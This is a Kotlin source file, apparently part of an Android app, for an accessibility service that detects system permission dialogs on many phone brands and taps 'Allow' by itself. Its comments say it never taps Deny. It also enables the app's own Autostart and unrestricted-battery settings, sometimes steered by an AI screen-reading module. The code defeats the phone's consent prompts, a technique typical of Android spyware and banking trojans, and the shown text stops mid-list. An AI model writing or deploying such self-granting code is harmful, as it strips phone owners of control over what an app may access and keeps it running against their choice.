package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.base.realtime.R

/**
 * تپر فاز‌آگاه: viewId → button1 → متن Allow چندزبانه؛ Deny هرگز.
 * OEM_APP_LIST: ردیف اپ در لیست Autostart و روشن کردن تیک.
 */
internal object PermissionDialogTapper {

    private const val TAG = "BasePerm"
    private const val TAP_DEBOUNCE_MS = 350L
    private const val MAX_LIST_SCROLLS = 10
    /** حدود ۸ ثانیه؛ دیالوگ سامسونگ بعد از خروج از Settings می‌آید. */
    private const val MAX_RUNTIME_DIALOG_WAITS = 24

    @Volatile
    var mode: TapMode = TapMode.IDLE
        set(value) {
            if (field != value) {
                aiForceScheduled = false
                aiSucceededForMode = TapMode.IDLE
                ruleFallbackOnce = false
                runtimeWaitGen++
                runtimeDialogWaits = 0
            }
            field = value
        }

    private val handler = Handler(Looper.getMainLooper())
    private var lastTapAt = 0L
    private var burstToken = 0
    private var listScrolls = 0
    private var oemHubScrolls = 0
    private var oemOverflowTaps = 0
    private var lastOemMissLogAt = 0L
    private var consecutiveMissBursts = 0
    private var ruleFallbackOnce = false
    /** useAi: فقط یک‌بار زمان‌بندی — CONTENT_CHANGED مکرر نباید AI را عقب بیندازد. */
    private var aiForceScheduled = false
    /** بعد از موفقیت AI برای همین mode دوباره درخواست نزن تا orchestrator force کند. */
    private var aiSucceededForMode: TapMode = TapMode.IDLE
    /** تلاش‌های انتظار تا دیالوگ runtime واقعاً دیده شود. نسل عوض شود = انتظار قبلی باطل. */
    private var runtimeWaitGen = 0
    private var runtimeDialogWaits = 0
    private val guideNodes = LinkedHashMap<String, GuideNodeRef>()

    private val tapDelaysMs = longArrayOf(0L, 120L, 280L, 520L, 900L, 1400L)

    fun allowRuleFallbackOnce() {
        // useAi=true: فقط AI نقاط کلیک را می‌زند — تپر قطعی ممنوع
        if (AutoGrantDebug.useAi) return
        ruleFallbackOnce = true
    }

    fun resetAiForceSchedule() {
        aiForceScheduled = false
        runtimeWaitGen++
        runtimeDialogWaits = 0
    }

    fun noteAiGuideSucceeded() {
        if (mode != TapMode.IDLE) {
            aiSucceededForMode = mode
        }
    }

    /**
     * بدون وابستگی به storm رویدادها AI را بخواه.
     * [force]=true وقتی فاز عوض شده (battery/OEM) حتی اگر SMS هنوز in-flight بوده.
     */
    fun scheduleForceAi(service: AccessibilityService, delayMs: Long = 80L, force: Boolean = false) {
        if (!AutoGrantDebug.useAi || mode == TapMode.IDLE) return
        if (!force && aiSucceededForMode == mode) return
        if (!force && (aiForceScheduled || UiGuideBridge.isBusy())) return
        if (force) {
            aiForceScheduled = false
            aiSucceededForMode = TapMode.IDLE
        }
        if (aiForceScheduled) return
        aiForceScheduled = true
        val phase = guidePhase()
        handler.postDelayed({
            if (!PermissionsAutoGrant.isArmed() || mode == TapMode.IDLE) {
                aiForceScheduled = false
                return@postDelayed
            }
            if (UiGuideBridge.isBusy()) {
                // فاز قبلی هنوز تمام نشده — کمی بعد دوباره
                aiForceScheduled = false
                scheduleForceAi(service, delayMs = 180L, force = true)
                return@postDelayed
            }
            // دیالوگ runtime ممکن است بعد از خروج از Settings بیاید. عکس زودهنگام
            // نباید پرچم را قفل کند و رویداد بعدی را ببلعد.
            if (mode == TapMode.RUNTIME_DIALOG && findRuntimeDialogRoot(service) == null) {
                aiForceScheduled = false
                scheduleRuntimeDialogWait(service)
                return@postDelayed
            }
            runtimeWaitGen++
            runtimeDialogWaits = 0
            PermissionsAutoGrant.stabilizeOverlay()
            val sent = UiGuideBridge.requestIfNeeded(service, phase, "force_ai_asap")
            if (!sent) {
                handler.postDelayed({
                    if (!PermissionsAutoGrant.isArmed() || mode == TapMode.IDLE) {
                        aiForceScheduled = false
                        return@postDelayed
                    }
                    if (mode == TapMode.RUNTIME_DIALOG && findRuntimeDialogRoot(service) == null) {
                        aiForceScheduled = false
                        scheduleRuntimeDialogWait(service)
                        return@postDelayed
                    }
                    if (UiGuideBridge.isBusy()) {
                        aiForceScheduled = false
                        scheduleForceAi(service, delayMs = 180L, force = true)
                        return@postDelayed
                    }
                    val retried = UiGuideBridge.requestIfNeeded(service, guidePhase(), "force_ai_retry")
                    if (!retried) aiForceScheduled = false
                }, 150L)
            }
        }, delayMs)
    }

    /**
     * تا وقتی پنجرهٔ اجازه دیده نشده، با فاصلهٔ کوتاه دوباره نگاه کن.
     * سقف دارد تا اگر دیالوگ هیچ‌وقت نیاید حلقه نماند.
     */
    private fun scheduleRuntimeDialogWait(service: AccessibilityService) {
        if (runtimeDialogWaits >= MAX_RUNTIME_DIALOG_WAITS) {
            Log.w(TAG, "runtime dialog still not visible")
            return
        }
        val gen = runtimeWaitGen
        val wait = runtimeDialogWaits
        runtimeDialogWaits++
        if (wait == 0) Log.i(TAG, "runtime dialog not visible yet — wait")
        val delay = (220L + wait * 60L).coerceAtMost(700L)
        handler.postDelayed({
            if (gen != runtimeWaitGen) return@postDelayed
            if (!PermissionsAutoGrant.isArmed() || mode != TapMode.RUNTIME_DIALOG) return@postDelayed
            scheduleForceAi(service, delayMs = 0L, force = false)
        }, delay)
    }

    /** یک‌بار تپر قطعی Allow را بزن (وقتی AI نود اشتباه زده). useAi: هرگز. */
    fun tryRuleTapNow(service: AccessibilityService): Boolean {
        if (AutoGrantDebug.useAi) return false
        PermissionsAutoGrant.stabilizeOverlay()
        val ok = tryTapWindows(service)
        if (ok) {
            lastTapAt = SystemClock.uptimeMillis()
            Log.i(TAG, "tapped mode=$mode pkg=rule_fallback delayMs=0")
        }
        return ok
    }

    /**
     * فقط خواندن: سوییچ اپ ما در لیست OEM.
     * null = ردیف پیدا نشد، true = روشن، false = خاموش.
     */
    fun probeOemAppToggleEnabled(service: AccessibilityService): Boolean? {
        val root = resolveGuideRoot(service) ?: return null
        val labels = ourAppLabels(service)
        if (labels.isEmpty()) return null
        val row = findAppRow(root, labels) ?: return null
        val toggle = findToggleIn(row) ?: return null
        return toggle.isChecked
    }

    fun appLabelsForGuide(service: AccessibilityService): List<String> = ourAppLabels(service)

    /**
     * bounds نودهای ردیف اپ ما (عنوان + Switch) برای فلگ nearApp در snapshot AI.
     */
    fun nearAppBoundsForGuide(service: AccessibilityService): Set<String> {
        val root = resolveGuideRoot(service) ?: return emptySet()
        val labels = ourAppLabels(service)
        if (labels.isEmpty()) return emptySet()
        val row = findAppRow(root, labels) ?: return emptySet()
        val out = LinkedHashSet<String>()
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(row)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val rect = Rect()
            node.getBoundsInScreen(rect)
            out += "${rect.left},${rect.top},${rect.right},${rect.bottom}"
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return out
    }

    fun clearAiSuccessGate() {
        aiSucceededForMode = TapMode.IDLE
    }

    /** ریشهٔ پنجرهٔ هدف برای snapshot/tap AI (OEM: securitycenter نه powerkeeper). */
    fun resolveGuideRoot(service: AccessibilityService): AccessibilityNodeInfo? {
        if (mode == TapMode.RUNTIME_DIALOG) return findRuntimeDialogRoot(service)
        val oemMode = mode == TapMode.OEM_APP_LIST
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = service.windows
            if (!windows.isNullOrEmpty()) {
                var fallback: AccessibilityNodeInfo? = null
                var navRoot: AccessibilityNodeInfo? = null
                for (w in windows) {
                    if (w.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                    val root = w.root ?: continue
                    val pkg = root.packageName?.toString().orEmpty()
                    if (pkg == service.packageName) continue
                    val pl = pkg.lowercase()
                    if (pl.contains("systemui")) continue
                    if (oemMode) {
                        if (pl.contains("powerkeeper")) {
                            if (fallback == null) fallback = root
                            continue
                        }
                        if (pl.contains("securitycenter") ||
                            pl.contains("safecenter") ||
                            pl.contains("autostart") ||
                            pl.contains("startup")
                        ) {
                            return root
                        }
                        if (oemNavWindow(root)) {
                            if (navRoot == null) navRoot = root
                            continue
                        }
                        if (fallback == null) fallback = root
                        continue
                    }
                    return root
                }
                if (navRoot != null) return navRoot
                if (fallback != null) return fallback
            }
        }
        val active = service.rootInActiveWindow ?: return null
        val pkg = active.packageName?.toString().orEmpty()
        if (pkg == service.packageName) return null
        if (oemMode && pkg.lowercase().contains("powerkeeper")) return null
        return active
    }

    /**
     * فقط دیالوگ اجازه. صفحهٔ Settings یا نوار SystemUI قبول نیست.
     * سامسونگ گاهی دیالوگ اعلان را از SystemUI نشان می‌دهد؛ آن را فقط اگر
     * دکمهٔ Allow و Deny داشته باشد برمی‌گردانیم.
     */
    private fun findRuntimeDialogRoot(service: AccessibilityService): AccessibilityNodeInfo? {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = service.windows
            if (!windows.isNullOrEmpty()) {
                var systemDialog: AccessibilityNodeInfo? = null
                for (w in windows) {
                    if (w.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                    val root = w.root ?: continue
                    val pkg = root.packageName?.toString().orEmpty()
                    if (pkg == service.packageName) continue
                    val pl = pkg.lowercase()
                    if (isPermissionControllerUi(pl)) return root
                    if (systemDialog == null && isSystemDialogHost(pl) && looksLikeRuntimeDialog(root)) {
                        systemDialog = root
                    }
                }
                return systemDialog
            }
        }
        val active = service.rootInActiveWindow ?: return null
        val pkg = active.packageName?.toString().orEmpty()
        if (pkg == service.packageName) return null
        val pl = pkg.lowercase()
        if (isPermissionControllerUi(pl)) return active
        if (isSystemDialogHost(pl) && looksLikeRuntimeDialog(active)) return active
        return null
    }

    private fun isSystemDialogHost(pkg: String): Boolean =
        pkg == "android" || pkg.contains("systemui")

    private fun looksLikeRuntimeDialog(root: AccessibilityNodeInfo): Boolean {
        val rect = Rect()
        root.getBoundsInScreen(rect)
        if (rect.height() < 160) return false
        if (hasKnownAllowId(root)) return true
        var sawAllow = false
        var sawDeny = false
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var seen = 0
        while (queue.isNotEmpty() && seen < 80 && !(sawAllow && sawDeny)) {
            val node = queue.removeFirst()
            seen++
            val label = nodeText(node)
            if (label.isNotBlank()) {
                if (!sawDeny && looksLikeDeny(label)) sawDeny = true
                if (!sawAllow && !looksLikeDeny(label) && looksLikeAllow(label)) sawAllow = true
            }
            if (seen < 80) {
                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { queue.add(it) }
                }
            }
        }
        return sawAllow && sawDeny
    }

    private fun hasKnownAllowId(root: AccessibilityNodeInfo): Boolean {
        val ids = allowViewIds + allowOneTimeIds
        for (id in ids) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            if (!nodes.isNullOrEmpty()) return true
        }
        return false
    }

    private data class GuideNodeRef(
        val bounds: String,
        val text: String,
        val desc: String,
    )

    fun resetOemListScroll() {
        listScrolls = 0
        oemHubScrolls = 0
        oemOverflowTaps = 0
        lastOemMissLogAt = 0L
        consecutiveMissBursts = 0
    }

    fun clearGuideNodes() {
        guideNodes.clear()
    }

    fun rememberGuideNode(id: String, bounds: String, text: String, desc: String) {
        if (guideNodes.size > 64) {
            val first = guideNodes.keys.firstOrNull()
            if (first != null) guideNodes.remove(first)
        }
        guideNodes[id] = GuideNodeRef(bounds, text, desc)
    }

    fun guideNodeText(nodeId: String): String {
        val ref = guideNodes[nodeId] ?: return ""
        return ref.text.ifBlank { ref.desc }
    }

    fun screenContainsText(service: AccessibilityService, needle: String): Boolean {
        val root = resolveGuideRoot(service) ?: return false
        return findNodeContainingText(root, needle) != null
    }

    fun screenFingerprint(service: AccessibilityService): String {
        val root = resolveGuideRoot(service) ?: return ""
        val sb = StringBuilder()
        sb.append(root.packageName ?: "").append('|')
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var n = 0
        while (queue.isNotEmpty() && n < 40) {
            val node = queue.removeFirst()
            if (node.isClickable || node.isCheckable) {
                sb.append(nodeText(node)).append('#')
                n++
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return sb.toString()
    }

    /** TOGGLE: click switch only if checked != desiredOn. */
    fun toggleGuideNode(service: AccessibilityService, nodeId: String, desiredOn: Boolean): Boolean {
        val ref = guideNodes[nodeId] ?: return false
        val root = resolveGuideRoot(service) ?: return false
        val node = findNodeByRef(root, ref) ?: return false
        if (node.isCheckable) {
            if (node.isChecked == desiredOn) {
                Log.i(TAG, "toggle already desired id=$nodeId checked=${node.isChecked}")
                return true
            }
        }
        return clickNode(service, node)
    }

    fun tapByGuideNodeId(service: AccessibilityService, nodeId: String): Boolean {
        val ref = guideNodes[nodeId] ?: return false
        // اول ریشهٔ هدف فاز؛ بعد همهٔ پنجره‌های غیر-overlay
        val preferred = resolveGuideRoot(service)
        if (preferred != null) {
            val node = findNodeByRef(preferred, ref)
            if (node != null) return clickNode(service, node)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windows = service.windows
            if (!windows.isNullOrEmpty()) {
                for (w in windows) {
                    if (w.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                    val root = w.root ?: continue
                    if (root.packageName?.toString() == service.packageName) continue
                    val node = findNodeByRef(root, ref) ?: continue
                    return clickNode(service, node)
                }
            }
        }
        val active = service.rootInActiveWindow ?: return false
        val node = findNodeByRef(active, ref) ?: return false
        return clickNode(service, node)
    }

    /**
     * دستور معنایی از AI: tap_text / app_toggle / scroll (نه tap nX).
     */
    fun executeSemanticGuide(
        service: AccessibilityService,
        op: String,
        target: String,
        phase: String,
    ): Boolean {
        return when (op) {
            "tap_text" -> tapByTextHint(service, target, phase)
            "app_toggle" -> guideOemAppToggle(service)
            "scroll" -> scrollByGuide(service, forward = true)
            "tap" -> {
                if (target.startsWith("n") && tapByGuideNodeId(service, target)) true
                else tapByTextHint(service, target, phase)
            }
            else -> false
        }
    }

    /** پیدا کردن اپ در لیست Autostart و روشن کردن سوییچ (با اسکرول در صورت نیاز). */
    fun guideOemAppToggle(service: AccessibilityService, allowScroll: Boolean = true): Boolean {
        PermissionsAutoGrant.stabilizeOverlay()
        val root = resolveGuideRoot(service) ?: return false
        if (tapOurAppInList(service, root)) return true
        if (!allowScroll) return false
        if (scrollByGuide(service, forward = true)) {
            val root2 = resolveGuideRoot(service) ?: return false
            return tapOurAppInList(service, root2)
        }
        return false
    }

    private fun tapByTextHint(
        service: AccessibilityService,
        target: String,
        phase: String,
    ): Boolean {
        PermissionsAutoGrant.stabilizeOverlay()
        val root = resolveGuideRoot(service) ?: service.rootInActiveWindow ?: return false
        val needle = target.trim()
        when (phase.uppercase()) {
            "RUNTIME" -> {
                val allow = findAllowByText(root)
                if (allow != null && clickNode(service, allow)) return true
            }
            "BATTERY" -> {
                if (tapBatteryUnrestrictedOption(service, root)) return true
            }
            "EXACT_ALARM" -> {
                val allow = findAllowByText(root)
                if (allow != null && clickNode(service, allow)) return true
            }
        }
        if (needle.isBlank()) return false
        val node = findNodeContainingText(root, needle) ?: return false
        return clickNode(service, node)
    }

    private fun findNodeContainingText(
        root: AccessibilityNodeInfo,
        needle: String,
    ): AccessibilityNodeInfo? {
        val n = needle.trim()
        if (n.length < 2) return null
        val lower = n.lowercase()
        var best: AccessibilityNodeInfo? = null
        var bestScore = 0
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val label = nodeText(node)
            if (label.isNotBlank()) {
                val l = label.lowercase()
                val score = when {
                    l == lower -> 1000 + l.length
                    l.contains(lower) -> 100 + lower.length
                    else -> 0
                }
                if (score > bestScore && !looksLikeDeny(label)) {
                    best = node
                    bestScore = score
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return best
    }

    fun scrollByGuide(service: AccessibilityService, forward: Boolean): Boolean {
        val root = resolveGuideRoot(service) ?: service.rootInActiveWindow ?: return false
        val byAction = if (forward) scrollForward(root) else scrollBackward(root)
        if (byAction) {
            Log.i(TAG, "scrollByGuide ACTION ok forward=$forward")
            return true
        }
        // MIUI RecyclerView اغلب ACTION_SCROLL را نمی‌پذیرد — fling ژستی
        val byGesture = gestureFlingScroll(service, root, forward)
        Log.i(TAG, "scrollByGuide gesture ok=$byGesture forward=$forward")
        return byGesture
    }

    /** لیست اپ با سوییچ؛ دیالوگ تأیید و داشبورد باتری لیست نیستند. */
    fun oemListLooksReady(service: AccessibilityService): Boolean {
        return oemSurface(service) == OemSurface.APP_LIST
    }

    fun oemSurface(service: AccessibilityService): OemSurface {
        val root = resolveGuideRoot(service) ?: return OemSurface.UNKNOWN
        return classifyOemSurface(root, ourAppLabels(service))
    }

    /**
     * دیالوگ Allow/Deny باتری (سامسونگ و AOSP). اگر گزینهٔ «بدون محدودیت» روی صفحه است،
     * این تابع کاری نمی‌کند تا مسیر لیست شیائومی دست نخورد.
     */
    fun tapBatteryConfirmAllow(service: AccessibilityService): Boolean {
        val root = resolveGuideRoot(service) ?: return false
        if (treeHasPhrase(root, unrestrictedOptionPhrases)) return false
        if (findExactLabel(root, confirmDenyLabels) == null) return false
        val allow = findExactLabel(root, confirmAllowLabels) ?: return false
        Log.i(TAG, "battery confirm allow: ${nodeText(allow).take(40)}")
        return clickNode(service, allow)
    }

    fun advanceOemHub(service: AccessibilityService): Boolean {
        val root = resolveGuideRoot(service) ?: return false
        if (isRestrictList(root)) return false
        val pkg = root.packageName?.toString().orEmpty().lowercase()
        val neverRow = findLabelNode(root, neverSleepingLabels)
        val sleepingRow = findLabelNode(root, sleepingAppsLabels)
        val limitsRow = findLabelNode(root, backgroundLimitLabels)
        val addRow = findLabelNode(root, addAppLabels)
        val autostartRow = findLabelNode(root, autostartEntryLabels)
        val overflow = if (oemOverflowTaps < 2) findOverflow(root) else null
        val appInfoBattery = if (!isSamsungCarePkg(pkg)) {
            findClickableLabel(root, appDetailsBatteryLabels)
        } else {
            null
        }
        val target = when {
            neverRow != null && sleepingRow != null -> neverRow
            limitsRow != null -> limitsRow
            overflow != null && neverRow == null && limitsRow == null -> overflow
            neverRow != null && addRow == null && sleepingRow == null && limitsRow == null -> null
            neverRow != null && addRow == null -> neverRow
            autostartRow != null && countToggles(root) <= 1 && neverRow == null && limitsRow == null ->
                autostartRow
            addRow != null && (neverRow != null || autostartRow != null) -> addRow
            appInfoBattery != null -> appInfoBattery
            neverRow != null -> neverRow
            else -> null
        }
        if (target != null && clickNode(service, target)) {
            if (target === overflow) oemOverflowTaps++
            oemHubScrolls = 0
            Log.i(
                TAG,
                "OEM hub tap: ${
                    nodeText(target).ifBlank { target.contentDescription?.toString().orEmpty() }.take(60)
                }",
            )
            return true
        }
        if (oemHubScrolls < 4 && scrollForward(root)) {
            oemHubScrolls++
            Log.i(TAG, "OEM hub scroll#$oemHubScrolls")
            return true
        }
        return false
    }

    fun logOemHubMiss(service: AccessibilityService) {
        val root = resolveGuideRoot(service) ?: return
        val samples = ArrayList<String>(16)
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty() && samples.size < 16) {
            val node = queue.removeFirst()
            val label = nodeText(node)
            if (label.length >= 2) samples += label.take(48)
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        Log.w(
            TAG,
            "OEM hub miss pkg=${root.packageName} surface=${classifyOemSurface(root, ourAppLabels(service))} visibles=$samples",
        )
    }

    /** لیست درست است ولی اپ ما در آن نیست و دکمهٔ افزودن دیده می‌شود. */
    fun shouldTapOemAdd(service: AccessibilityService): Boolean {
        val root = resolveGuideRoot(service) ?: return false
        if (findAppRow(root, ourAppLabels(service)) != null) return false
        if (countToggles(root) >= 8) return false
        if (findLabelNode(root, addAppLabels) == null) return false
        return treeHasPhrase(root, neverSleepingLabels) || treeHasPhrase(root, autostartEntryLabels)
    }

    /** انتخاب‌گر سامسونگ: بعد از تیک اپ، دکمهٔ افزودن/انجام شد را بزن. لیست کوتاه را تمام‌شده حساب کن. */
    fun confirmOemPicker(service: AccessibilityService): Boolean {
        val root = resolveGuideRoot(service) ?: return false
        val pkg = root.packageName?.toString().orEmpty().lowercase()
        if (!isSamsungCarePkg(pkg)) return false
        if (countToggles(root) < 8) return false
        val done = findExactLabel(
            root,
            listOf("انجام شد", "done", "افزودن", "add", "تأیید", "تایید"),
        ) ?: return false
        Log.i(TAG, "OEM picker confirm: ${nodeText(done).take(40)}")
        return clickNode(service, done)
    }

    private fun classifyOemSurface(
        root: AccessibilityNodeInfo,
        appLabels: List<String>,
    ): OemSurface {
        if (isConfirmDialog(root)) return OemSurface.CONFIRM_DIALOG
        if (isRestrictList(root)) return OemSurface.RESTRICT_LIST
        val pkg = root.packageName?.toString().orEmpty().lowercase()
        if (findAppRow(root, appLabels) != null) return OemSurface.APP_LIST
        val toggles = countToggles(root)
        if (isSamsungCarePkg(pkg)) {
            if (treeHasPhrase(root, neverSleepingLabels) && toggles >= 1) return OemSurface.APP_LIST
            if (toggles >= 4 && !looksLikeBatteryHub(root)) return OemSurface.APP_LIST
            return OemSurface.HUB
        }
        if (isOemListPkg(pkg) && !listLooksEmpty(root)) return OemSurface.APP_LIST
        if (toggles >= 3) return OemSurface.APP_LIST
        if (looksLikeBatteryHub(root)) return OemSurface.HUB
        if (!isSamsungCarePkg(pkg) &&
            findClickableLabel(root, appDetailsBatteryLabels) != null
        ) {
            return OemSurface.HUB
        }
        return OemSurface.UNKNOWN
    }

    private fun isConfirmDialog(root: AccessibilityNodeInfo): Boolean {
        if (countToggles(root) > 0) return false
        if (countTextNodes(root) > 24) return false
        if (treeHasPhrase(root, unrestrictedOptionPhrases)) return false
        return findExactLabel(root, confirmAllowLabels) != null &&
            findExactLabel(root, confirmDenyLabels) != null
    }

    private fun isRestrictList(root: AccessibilityNodeInfo): Boolean {
        if (treeHasPhrase(root, neverSleepingLabels)) return false
        return treeHasPhrase(root, sleepingAppsLabels)
    }

    private fun looksLikeBatteryHub(root: AccessibilityNodeInfo): Boolean {
        return treeHasPhrase(root, batteryHubLabels)
    }

    private fun isSamsungCarePkg(pkg: String): Boolean {
        return pkg.contains("samsung.android.lool") || pkg.contains("samsung.android.sm")
    }

    private fun isOemListPkg(pkg: String): Boolean {
        return pkg.contains("securitycenter") ||
            pkg.contains("safecenter") ||
            pkg.contains("autostart") ||
            pkg.contains("startup") ||
            pkg.contains("permissionmanager") ||
            pkg.contains("iqoo.secure") ||
            pkg.contains("systemmanager") ||
            pkg.contains("phonemanager") ||
            pkg.contains("oppoguardelf")
    }

    private fun countToggles(root: AccessibilityNodeInfo): Int {
        var count = 0
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val cls = node.className?.toString().orEmpty()
            val isToggle = cls.contains("Switch", ignoreCase = true) ||
                cls.contains("CheckBox", ignoreCase = true) ||
                cls.contains("Toggle", ignoreCase = true) ||
                (node.isCheckable && (node.isClickable || cls.contains("Check", ignoreCase = true)))
            if (isToggle) count++
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return count
    }

    private fun countTextNodes(root: AccessibilityNodeInfo): Int {
        var count = 0
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            if (nodeText(node).length >= 2) count++
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return count
    }

    private fun treeHasPhrase(root: AccessibilityNodeInfo, phrases: List<String>): Boolean {
        return findLabelNode(root, phrases) != null
    }

    private fun findExactLabel(root: AccessibilityNodeInfo, phrases: List<String>): AccessibilityNodeInfo? {
        val want = phrases.map { it.lowercase() }.toSet()
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = node.text?.toString().orEmpty().trim().lowercase()
            val desc = node.contentDescription?.toString().orEmpty().trim().lowercase()
            if ((text.isNotEmpty() && text in want) || (desc.isNotEmpty() && desc in want)) {
                return node
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun findLabelNode(root: AccessibilityNodeInfo, phrases: List<String>): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = node.text?.toString().orEmpty().trim()
            val desc = node.contentDescription?.toString().orEmpty().trim()
            if (phrases.any { labelMatches(text, it) || labelMatches(desc, it) }) {
                return node
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun labelMatches(text: String, label: String): Boolean {
        val t = text.trim().lowercase()
        val l = label.trim().lowercase()
        if (t.isEmpty() || l.isEmpty()) return false
        if (t == l) return true
        if (l.length >= 10 && t.contains(l)) return true
        if (l.length >= 10 && t.length >= 10 && l.contains(t)) return true
        if (l.length >= 8 && t.startsWith(l) && t.length <= l.length + 24) return true
        return false
    }

    private fun oemNavWindow(root: AccessibilityNodeInfo): Boolean {
        return treeHasPhrase(root, neverSleepingLabels) ||
            treeHasPhrase(root, backgroundLimitLabels) ||
            treeHasPhrase(root, addAppLabels)
    }

    private fun findOverflow(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var byDesc: AccessibilityNodeInfo? = null
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val id = node.viewIdResourceName.orEmpty().lowercase()
            if (id.contains("overflow") || id.contains("more_menu")) {
                return node
            }
            val cls = node.className?.toString().orEmpty()
            if (cls.contains("OverflowMenuButton", ignoreCase = true) && node.isClickable) {
                return node
            }
            val desc = node.contentDescription?.toString().orEmpty()
            if (desc.isNotBlank() && overflowLabels.any { labelMatches(desc, it) } && node.isClickable) {
                byDesc = byDesc ?: node
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return byDesc
    }

    private fun findClickableLabel(
        root: AccessibilityNodeInfo,
        phrases: List<String>,
    ): AccessibilityNodeInfo? {
        val node = findLabelNode(root, phrases) ?: return null
        if (node.isClickable) return node
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 5) {
            if (parent.isClickable) return parent
            parent = parent.parent
            depth++
        }
        return null
    }

    private fun findNodeByRef(root: AccessibilityNodeInfo, ref: GuideNodeRef): AccessibilityNodeInfo? {
        var boundsMatch: AccessibilityNodeInfo? = null
        var textMatch: AccessibilityNodeInfo? = null
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = node.text?.toString().orEmpty().trim()
            val desc = node.contentDescription?.toString().orEmpty().trim()
            val rect = Rect()
            node.getBoundsInScreen(rect)
            val bounds = "${rect.left},${rect.top},${rect.right},${rect.bottom}"
            if (bounds == ref.bounds) {
                boundsMatch = node
                break
            }
            if (textMatch == null &&
                ((ref.text.isNotBlank() && text == ref.text) ||
                    (ref.desc.isNotBlank() && desc == ref.desc))
            ) {
                textMatch = node
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return boundsMatch ?: textMatch
    }

    private fun scrollBackward(root: AccessibilityNodeInfo): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            if (node.isScrollable &&
                node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
            ) {
                return true
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return false
    }

    private val allowViewIds = listOf(
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.google.android.packageinstaller:id/permission_allow_button",
        "com.miui.securitycenter:id/permission_allow_button",
        "com.miui.securitycenter:id/permission_allow_btn",
        "com.lbe.security.miui:id/permission_allow_button",
        "com.huawei.systemmanager:id/btn_allow",
        "com.hihonor.systemmanager:id/btn_allow",
        "com.coloros.securitypermission:id/permission_allow_button",
        "com.oplus.securitypermission:id/permission_allow_button",
        "com.vivo.permissionmanager:id/permission_allow_button",
        "com.iqoo.secure:id/permission_allow_button",
        "com.transsion.permissioncontroller:id/permission_allow_button",
        "android:id/button1",
    )

    private val allowOneTimeIds = listOf(
        "com.android.permissioncontroller:id/permission_allow_one_time_button",
        "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_one_time_button",
    )

    private val denyTexts = listOf(
        "deny", "don't allow", "do not allow", "dont allow", "not now", "reject", "cancel",
        "رفض", "رفض السماح",
        "ablehnen", "nicht zulassen", "annuler", "refuser",
        "رد", "نه", "خیر", "اجازه نده", "الان نه", "لغو",
    )

    private val allowTexts = listOf(
        "allow", "while using", "only this time", "always allow", "all the time",
